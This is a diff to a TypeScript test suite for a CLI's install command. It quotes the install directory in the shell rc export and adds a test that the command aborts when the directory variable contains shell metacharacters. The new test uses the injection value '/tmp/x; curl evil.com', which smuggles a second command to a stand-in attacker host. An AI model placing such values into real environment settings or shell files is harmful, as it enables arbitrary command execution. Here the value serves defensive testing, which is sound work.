@@ -225,10 +225,28 @@ describe('CLI: composio install', () => {
           const rcPath = path.join(os.homedir, '.zshrc');
           const contents = yield* fs.readFileString(rcPath);
 
-          // Should use ~/.composio as the default install directory
+          // Should use ~/.composio as the default install directory (quoted)
           expect(contents).toContain(
-            `export COMPOSIO_INSTALL_DIR=${path.join(os.homedir, '.composio')}`
+            `export COMPOSIO_INSTALL_DIR="${path.join(os.homedir, '.composio')}"`
           );
+        })
+      );
+    });
+  });
+
+  describe('[When] COMPOSIO_INSTALL_DIR contains shell metacharacters', () => {
+    layer(TestLive())(it => {
+      it.scoped('[Then] aborts with an error', () =>
+        Effect.gen(function* () {
+          process.env.SHELL = '/bin/zsh';
+          process.env.COMPOSIO_INSTALL_DIR = '/tmp/x; curl evil.com';
+
+          yield* cli(['install']);
+
+          const lines = yield* MockConsole.getLines();
+          const output = lines.join('\n');
+          expect(output).toContain('unsafe characters');
+          expect(output).toContain('Aborted');
         })
       );
     });
